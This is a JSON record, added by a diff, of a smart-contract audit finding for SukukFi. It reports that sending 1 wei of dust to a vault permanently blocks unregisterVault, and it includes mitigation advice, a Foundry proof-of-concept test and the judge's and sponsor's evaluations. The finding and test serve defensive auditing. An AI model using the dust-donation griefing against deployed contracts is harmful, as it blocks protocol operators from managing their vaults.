@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "htv6vNdTbfQ",
+    "requested_finding_uid": "eJytFti7FNb",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "htv6vNdTbfQ",
+    "source_finding_uid": "eJytFti7FNb",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\medium_valid_htv6vNdTbfQ.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "htv6vNdTbfQ",
+  "finding_uid": "eJytFti7FNb",
+  "finding_number": "2",
+  "title": "Vault Unregistration DoS via Dust Donation",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xApple",
+  "body": "## Finding description and impact\n\nThe `unregisterVault()` function in `WERC7575ShareToken.sol` blocks vault removal when either `IERC7575Vault(vaultAddress).totalAssets()` or `ERC20(asset).balanceOf(vaultAddress)` is non-zero:\n\n```solidity\nif (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();\nif (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();\n```\n\nThis logic assumes that any asset balance in the vault represents user liabilities. However, anyone can **grief the protocol** by sending (“donating”) even 1 wei of the asset directly to the vault. Since the vault may not have a withdrawal/sweep mechanism, this **permanently forces `vaultBalance != 0`**, causing `unregisterVault()` to **always revert**.\n\nAs a result, an attacker can **DoS protocol governance** and prevent vault lifecycle operations, including:\n\n* Removing deprecated or faulty vaults\n* Migrating users to a new vault implementation\n* Cleaning up stale vault registry entries\n\nNo user funds are lost, but the protocol’s ability to manage and evolve vault infrastructure becomes hostage to any third-party donation.\n\n---\n\n## Recommended mitigation steps\n\nUse a condition that reflects **protocol liabilities**, not raw token balances. Possible fixes include:\n\n* Check **share supply or internal accounting** instead of `balanceOf(vaultAddress)`\n* Permit unregistration if vault assets are below a **dust threshold**\n* Add a **sweep/rescue mechanism** to clear arbitrary donations before unregistering",
+  "proof_of_concept": "Create a new file in test folder, run it with:\n```bash\nforge test -vvv --match-test test_UnregisterVaultWithAssetBalanceAuditIssue\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"../src/interfaces/IERC7575Errors.sol\";\nimport \"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title WERC7575ShareToken Coverage Tests\n * @notice Tests to improve code coverage of critical functions\n * @dev Focuses on error paths, edge cases, and boundary conditions\n */\ncontract WERC7575ShareTokenCoverageTests is Test {\n    WERC7575ShareToken public shareToken;\n    ERC20Faucet public token;\n    WERC7575Vault public vault;\n\n    address public validator;\n    address public revenueAdmin;\n    address public user1;\n    address public user2;\n    address public user3;\n\n    uint256 constant INITIAL_BALANCE = 1000 * 1e18;\n\n    function setUp() public {\n        user1 = makeAddr(\"user1\");\n        validator = makeAddr(\"validator\");\n        revenueAdmin = makeAddr(\"revenueAdmin\");\n\n        token = new ERC20Faucet(\"Test Token\", \"TEST\", 100000 * 1e18);\n        shareToken = new WERC7575ShareToken(\"Test Share\", \"tSHARE\");\n        vault = new WERC7575Vault(address(token), shareToken);\n\n        // Register vault for this asset before usage\n        shareToken.registerVault(address(token), address(vault));\n\n        // Configure roles\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        shareToken.setRevenueAdmin(revenueAdmin);\n\n        // Setup token faucet distribution\n        vm.warp(block.timestamp + 2 hours); // avoid faucet cooldown\n        token.faucetAmountFor(user1, INITIAL_BALANCE);\n\n        // Enable KYC for participating users\n        vm.prank(validator);\n        shareToken.setKycVerified(user1, true);\n    }\n\n    /**\n     * @notice Demonstrates the audit issue — vault unregistration can be DoS'ed\n     * @dev Anyone can grief the protocol by sending dust to the vault, making unregisterVault revert permanently\n     */\n    function test_UnregisterVaultWithAssetBalanceAuditIssue() public {\n        /////////////////////////////////////////////////\n        // Step 1: Remove vault when it has zero balance\n        /////////////////////////////////////////////////\n\n        // Expected to succeed because the vault has no assets yet\n        shareToken.unregisterVault(address(token));\n\n        /////////////////////////////////////////////////\n        // Step 2: Re-register vault then grief it\n        /////////////////////////////////////////////////\n\n        // Register the vault again\n        shareToken.registerVault(address(token), address(vault));\n\n        // User (or attacker) sends 1 wei to vault directly\n        // — this does *not* represent user deposits, but still increases raw vault balance\n        vm.prank(user1);\n        token.transfer(address(vault), 1);\n\n        /////////////////////////////////////////////////\n        // Step 3: Attempt unregistration — should now revert forever\n        /////////////////////////////////////////////////\n\n        // The revert is expected because the donated dust makes vaultBalance != 0\n        vm.expectRevert(\n            IERC7575Errors.CannotUnregisterVaultAssetBalance.selector\n        );\n        shareToken.unregisterVault(address(token));\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L274-L275"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "693",
+    "api_submission_id": "",
+    "uid": "htv6vNdTbfQ",
+    "number": "693",
+    "title": "Vault Unregistration DoS via Dust Donation",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xApple",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L274-L275"
+    ],
+    "body": "## Finding description and impact\n\nThe `unregisterVault()` function in `WERC7575ShareToken.sol` blocks vault removal when either `IERC7575Vault(vaultAddress).totalAssets()` or `ERC20(asset).balanceOf(vaultAddress)` is non-zero:\n\n```solidity\nif (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();\nif (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();\n```\n\nThis logic assumes that any asset balance in the vault represents user liabilities. However, anyone can **grief the protocol** by sending (“donating”) even 1 wei of the asset directly to the vault. Since the vault may not have a withdrawal/sweep mechanism, this **permanently forces `vaultBalance != 0`**, causing `unregisterVault()` to **always revert**.\n\nAs a result, an attacker can **DoS protocol governance** and prevent vault lifecycle operations, including:\n\n* Removing deprecated or faulty vaults\n* Migrating users to a new vault implementation\n* Cleaning up stale vault registry entries\n\nNo user funds are lost, but the protocol’s ability to manage and evolve vault infrastructure becomes hostage to any third-party donation.\n\n---\n\n## Recommended mitigation steps\n\nUse a condition that reflects **protocol liabilities**, not raw token balances. Possible fixes include:\n\n* Check **share supply or internal accounting** instead of `balanceOf(vaultAddress)`\n* Permit unregistration if vault assets are below a **dust threshold**\n* Add a **sweep/rescue mechanism** to clear arbitrary donations before unregistering",
+    "proof_of_concept": "Create a new file in test folder, run it with:\n```bash\nforge test -vvv --match-test test_UnregisterVaultWithAssetBalanceAuditIssue\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"../src/interfaces/IERC7575Errors.sol\";\nimport \"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title WERC7575ShareToken Coverage Tests\n * @notice Tests to improve code coverage of critical functions\n * @dev Focuses on error paths, edge cases, and boundary conditions\n */\ncontract WERC7575ShareTokenCoverageTests is Test {\n    WERC7575ShareToken public shareToken;\n    ERC20Faucet public token;\n    WERC7575Vault public vault;\n\n    address public validator;\n    address public revenueAdmin;\n    address public user1;\n    address public user2;\n    address public user3;\n\n    uint256 constant INITIAL_BALANCE = 1000 * 1e18;\n\n    function setUp() public {\n        user1 = makeAddr(\"user1\");\n        validator = makeAddr(\"validator\");\n        revenueAdmin = makeAddr(\"revenueAdmin\");\n\n        token = new ERC20Faucet(\"Test Token\", \"TEST\", 100000 * 1e18);\n        shareToken = new WERC7575ShareToken(\"Test Share\", \"tSHARE\");\n        vault = new WERC7575Vault(address(token), shareToken);\n\n        // Register vault for this asset before usage\n        shareToken.registerVault(address(token), address(vault));\n\n        // Configure roles\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        shareToken.setRevenueAdmin(revenueAdmin);\n\n        // Setup token faucet distribution\n        vm.warp(block.timestamp + 2 hours); // avoid faucet cooldown\n        token.faucetAmountFor(user1, INITIAL_BALANCE);\n\n        // Enable KYC for participating users\n        vm.prank(validator);\n        shareToken.setKycVerified(user1, true);\n    }\n\n    /**\n     * @notice Demonstrates the audit issue — vault unregistration can be DoS'ed\n     * @dev Anyone can grief the protocol by sending dust to the vault, making unregisterVault revert permanently\n     */\n    function test_UnregisterVaultWithAssetBalanceAuditIssue() public {\n        /////////////////////////////////////////////////\n        // Step 1: Remove vault when it has zero balance\n        /////////////////////////////////////////////////\n\n        // Expected to succeed because the vault has no assets yet\n        shareToken.unregisterVault(address(token));\n\n        /////////////////////////////////////////////////\n        // Step 2: Re-register vault then grief it\n        /////////////////////////////////////////////////\n\n        // Register the vault again\n        shareToken.registerVault(address(token), address(vault));\n\n        // User (or attacker) sends 1 wei to vault directly\n        // — this does *not* represent user deposits, but still increases raw vault balance\n        vm.prank(user1);\n        token.transfer(address(vault), 1);\n\n        /////////////////////////////////////////////////\n        // Step 3: Attempt unregistration — should now revert forever\n        /////////////////////////////////////////////////\n\n        // The revert is expected because the donated dust makes vaultBalance != 0\n        vm.expectRevert(\n            IERC7575Errors.CannotUnregisterVaultAssetBalance.selector\n        );\n        shareToken.unregisterVault(address(token));\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/693",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-04T19:34:46.578Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "Qm9iThgo7xg",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T06:34:35.865Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "eJytFti7FNb"
+        },
+        {
+          "uid": "AtSSRti82zm",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T06:34:38.709Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "eJytFti7FNb"
+        },
+        {
+          "uid": "5Nj82wqEWQx",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-09T22:59:09.324Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "htv6vNdTbfQ",
+          "findingUid": null
+        },
+        {
+          "uid": "LhCRWDAg8gt",
+          "userUid": "iTTPZ9u8kg9",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-12-22T13:45:56.706Z",
+          "type": "validity",
+          "value": "invalid",
+          "submissionUid": null,
+          "findingUid": "eJytFti7FNb"
+        }
+      ],
+      "finding": {
+        "uid": "eJytFti7FNb",
+        "number": 2,
+        "duplicates": 103
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "medium",
+        "validity": "valid",
+        "updatedAt": "2025-12-22T13:45:56.706Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Vault Unregistration DoS via Dust Donation",
+      "uid": "htv6vNdTbfQ",
+      "updatedAt": "2025-12-04T19:34:46.578Z",
+      "user": {
+        "uid": "dr9FoRqw8He",
+        "handle": "0xApple"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `unregisterVault()` function in `WERC7575ShareToken.sol` blocks vault removal when either `IERC7575Vault(vaultAddress).totalAssets()` or `ERC20(asset).balanceOf(vaultAddress)` is non-zero:\n\n```solidity\nif (totalAssets != 0) revert CannotUnregisterVaultAssetBalance();\nif (vaultBalance != 0) revert CannotUnregisterVaultAssetBalance();\n```\n\nThis logic assumes that any asset balance in the vault represents user liabilities. However, anyone can **grief the protocol** by sending (“donating”) even 1 wei of the asset directly to the vault. Since the vault may not have a withdrawal/sweep mechanism, this **permanently forces `vaultBalance != 0`**, causing `unregisterVault()` to **always revert**.\n\nAs a result, an attacker can **DoS protocol governance** and prevent vault lifecycle operations, including:\n\n* Removing deprecated or faulty vaults\n* Migrating users to a new vault implementation\n* Cleaning up stale vault registry entries\n\nNo user funds are lost, but the protocol’s ability to manage and evolve vault infrastructure becomes hostage to any third-party donation.\n\n---\n\n## Recommended mitigation steps\n\nUse a condition that reflects **protocol liabilities**, not raw token balances. Possible fixes include:\n\n* Check **share supply or internal accounting** instead of `balanceOf(vaultAddress)`\n* Permit unregistration if vault assets are below a **dust threshold**\n* Add a **sweep/rescue mechanism** to clear arbitrary donations before unregistering",
+      "proofOfConcept": "Create a new file in test folder, run it with:\n```bash\nforge test -vvv --match-test test_UnregisterVaultWithAssetBalanceAuditIssue\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"../src/interfaces/IERC7575Errors.sol\";\nimport \"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title WERC7575ShareToken Coverage Tests\n * @notice Tests to improve code coverage of critical functions\n * @dev Focuses on error paths, edge cases, and boundary conditions\n */\ncontract WERC7575ShareTokenCoverageTests is Test {\n    WERC7575ShareToken public shareToken;\n    ERC20Faucet public token;\n    WERC7575Vault public vault;\n\n    address public validator;\n    address public revenueAdmin;\n    address public user1;\n    address public user2;\n    address public user3;\n\n    uint256 constant INITIAL_BALANCE = 1000 * 1e18;\n\n    function setUp() public {\n        user1 = makeAddr(\"user1\");\n        validator = makeAddr(\"validator\");\n        revenueAdmin = makeAddr(\"revenueAdmin\");\n\n        token = new ERC20Faucet(\"Test Token\", \"TEST\", 100000 * 1e18);\n        shareToken = new WERC7575ShareToken(\"Test Share\", \"tSHARE\");\n        vault = new WERC7575Vault(address(token), shareToken);\n\n        // Register vault for this asset before usage\n        shareToken.registerVault(address(token), address(vault));\n\n        // Configure roles\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        shareToken.setRevenueAdmin(revenueAdmin);\n\n        // Setup token faucet distribution\n        vm.warp(block.timestamp + 2 hours); // avoid faucet cooldown\n        token.faucetAmountFor(user1, INITIAL_BALANCE);\n\n        // Enable KYC for participating users\n        vm.prank(validator);\n        shareToken.setKycVerified(user1, true);\n    }\n\n    /**\n     * @notice Demonstrates the audit issue — vault unregistration can be DoS'ed\n     * @dev Anyone can grief the protocol by sending dust to the vault, making unregisterVault revert permanently\n     */\n    function test_UnregisterVaultWithAssetBalanceAuditIssue() public {\n        /////////////////////////////////////////////////\n        // Step 1: Remove vault when it has zero balance\n        /////////////////////////////////////////////////\n\n        // Expected to succeed because the vault has no assets yet\n        shareToken.unregisterVault(address(token));\n\n        /////////////////////////////////////////////////\n        // Step 2: Re-register vault then grief it\n        /////////////////////////////////////////////////\n\n        // Register the vault again\n        shareToken.registerVault(address(token), address(vault));\n\n        // User (or attacker) sends 1 wei to vault directly\n        // — this does *not* represent user deposits, but still increases raw vault balance\n        vm.prank(user1);\n        token.transfer(address(vault), 1);\n\n        /////////////////////////////////////////////////\n        // Step 3: Attempt unregistration — should now revert forever\n        /////////////////////////////////////////////////\n\n        // The revert is expected because the donated dust makes vaultBalance != 0\n        vm.expectRevert(\n            IERC7575Errors.CannotUnregisterVaultAssetBalance.selector\n        );\n        shareToken.unregisterVault(address(token));\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575ShareToken.sol#L274-L275",
+      "number": 693,
+      "aiExplanation": null,
+      "_index": 693
+    }
+  }
+}
